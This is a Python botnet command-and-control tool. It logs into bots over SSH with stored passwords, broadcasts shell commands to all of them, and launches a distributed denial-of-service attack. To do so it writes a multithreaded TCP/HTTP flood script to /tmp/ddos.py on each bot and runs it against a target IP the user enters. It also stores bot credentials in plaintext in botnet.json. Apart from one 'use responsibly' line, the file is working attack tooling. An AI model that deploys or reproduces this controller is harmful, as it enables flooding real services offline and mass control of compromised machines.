import sys
import os
import json
from colorama import Fore, init
from pexpect import pxssh
from scapy.all import *

init(autoreset=True)

os.system('clear')

# Function to display menu
def display_menu():
    print(Fore.GREEN + "1. List Bots")
    print(Fore.GREEN + "2. Run Command")
    print(Fore.GREEN + "3. Bash")
    print(Fore.GREEN + "4. Add Bot")
    print(Fore.GREEN + "5. DDOS")
    print(Fore.YELLOW + "6. Stop DDOS")
    print(Fore.RED + "7. Exit")

# Connect to SSH server
def connect_ssh(host, port, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password, port=port)
        return s
    except Exception as e:
        print(Fore.RED + f"[!] Error connecting to {host}")
        print(e)
        return None

# Sending a command to execute
def send_command(session, cmd):
    session.sendline(cmd)
    session.prompt()
    return session.before

# Running through the loop to traverse the complete clients
def botnet_command(command):
    for client in botnet:
        if 'session' in client:
            session = client['session']
            output = send_command(session, command)
            print(f"[+] Output from " + client['host'])
            print("<<< " + output.decode())
        else:
            print(Fore.RED + f"[!] Error: No session found for {client['host']}")

# Adding new clients to botnet
def add_client(host, port, user, password):
    session = connect_ssh(host, port, user, password)
    if session:
        client_info = {'host': host, 'port': port, 'user': user, 'password': password, 'session': session}
        botnet.append(client_info)
        print(Fore.GREEN + "[+] Bot added successfully.")
    else:
        print(Fore.RED + "[!] Failed to add bot. The bot will not be added to the botnet list.")

# Input command to run
def ask_for_command():
    while True:
        if not botnet:
            print(Fore.RED + "[!] Error: No bots available.")
            break
        run = input(Fore.GREEN + "Enter a command to run (or type 'exit' to return to menu): ")
        if run.lower() == 'exit':
            break
        botnet_command(run)

# Input command to run in bash
def bash():
    while True:
        if not botnet:
            print(Fore.RED + "[!] Error: No bots available.")
            break
        bash_command = input(">>> ")
        for client in botnet:
            if 'session' in client:
                session = client['session']
                output = send_command(session, f"echo {bash_command} | /bin/bash")
                print(f"[+] Output from " + client['host'])
                print("<<< " + output.decode())
            else:
                print(Fore.RED + f"[!] Error: No session found for {client['host']}")
        if bash_command.lower() == 'exit':
            break

# DDOS attack using botnet
def ddos_attack():
    if not botnet:
        print(Fore.RED + "[!] Error: No bots available for DDOS attack.")
        return
    
    target_IP = input("Enter target IP address: ")
    target_port = input("Enter target port (default 80): ")
    if not target_port:
        target_port = 80
    else:
        target_port = int(target_port)
    
    duration = input("Enter attack duration in seconds (default 60): ")
    if not duration:
        duration = 60
    else:
        duration = int(duration)
    
    print(Fore.YELLOW + f"[*] Starting DDOS attack on {target_IP}:{target_port} for {duration} seconds...")
    print(Fore.YELLOW + f"[*] Using {len(botnet)} bots for distributed attack")
    
    # Create DDOS command for each bot
    ddos_command = f"""
import socket
import threading
import time
import random

def flood_target():
    target = '{target_IP}'
    port = {target_port}
    duration = {duration}
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b'GET / HTTP/1.1\\r\\nHost: ' + target.encode() + b'\\r\\n\\r\\n' + b'X' * 1024)
            s.close()
        except:
            pass

# Start multiple threads for flooding
for i in range(50):
    threading.Thread(target=flood_target).start()
"""
    
    # Send DDOS command to all bots
    for client in botnet:
        if 'session' in client:
            try:
                session = client['session']
                # Create a Python script on the bot
                session.sendline(f"cat > /tmp/ddos.py << 'EOF'")
                session.prompt()
                session.sendline(ddos_command)
                session.prompt()
                session.sendline("EOF")
                session.prompt()
                
                # Execute the DDOS script
                session.sendline("python3 /tmp/ddos.py &")
                session.prompt()
                print(Fore.GREEN + f"[+] DDOS attack started on bot {client['host']}")
            except Exception as e:
                print(Fore.RED + f"[!] Failed to start DDOS on bot {client['host']}: {str(e)}")
        else:
            print(Fore.RED + f"[!] No session found for bot {client['host']}")
    
    print(Fore.YELLOW + f"[*] DDOS attack initiated on all available bots")
    print(Fore.YELLOW + f"[*] Attack will run for {duration} seconds")
    print(Fore.RED + "[!] Use responsibly and only on systems you own or have permission to test")

# Stop DDOS attack on all bots
def stop_ddos():
    if not botnet:
        print(Fore.RED + "[!] Error: No bots available.")
        return
    
    print(Fore.YELLOW + "[*] Stopping DDOS attack on all bots...")
    
    for client in botnet:
        if 'session' in client:
            try:
                session = client['session']
                # Kill Python processes running the DDOS script
                session.sendline("pkill -f ddos.py")
                session.prompt()
                # Remove the DDOS script
                session.sendline("rm -f /tmp/ddos.py")
                session.prompt()
                print(Fore.GREEN + f"[+] DDOS stopped on bot {client['host']}")
            except Exception as e:
                print(Fore.RED + f"[!] Failed to stop DDOS on bot {client['host']}: {str(e)}")
        else:
            print(Fore.RED + f"[!] No session found for bot {client['host']}")
    
    print(Fore.GREEN + "[+] DDOS attack stopped on all available bots")

# Save botnet to a file
def save_botnet():
    botnet_data = [{'host': client['host'], 'port': client['port'], 'user': client['user'], 'password': client['password']} for client in botnet]
    with open('botnet.json', 'w') as f:
        json.dump(botnet_data, f)

# Load botnet from a file
def load_botnet():
    global botnet
    botnet = []  # Clear the current botnet list
    try:
        with open('botnet.json', 'r') as f:
            botnet_data = json.load(f)
        # Reconnect sessions for each bot
        for client_data in botnet_data:
            session = connect_ssh(client_data['host'], client_data['port'], client_data['user'], client_data['password'])
            if session:
                client_data['session'] = session
                botnet.append(client_data)
                print(Fore.GREEN + f"[+] Reconnected to bot {client_data['host']}")
            else:
                print(Fore.RED + f"[!] Failed to reconnect to bot {client_data['host']}.")
    except FileNotFoundError:
        botnet = []

# Main loop
botnet = []
load_botnet()  # Load the botnet at the start

while True:
    print("")
    display_menu()
    option = input(Fore.YELLOW + "Enter any option: ")
    if option == '1':
        if botnet:
            for client in botnet:
                print(Fore.CYAN + str(client))
        else:
            print(Fore.RED + "Botnet is empty.")
    elif option == '2':
        ask_for_command()
    elif option == '3':
        bash()
    elif option == '4':
        host = input("Enter the bot's IP address: ")
        port = input("Enter the bot's SSH port number: ")
        user = input("Enter the bot's username: ")
        password = input("Enter the bot's password: ")
        add_client(host, port, user, password)
        save_botnet()  # Save botnet after adding a client
    elif option == '5':
        ddos_attack()
    elif option == '6':
        stop_ddos()
    elif option == '7':
        save_botnet()  # Save botnet before exiting
        sys.exit()
    else:
        print("Invalid option. Please choose a valid option.")
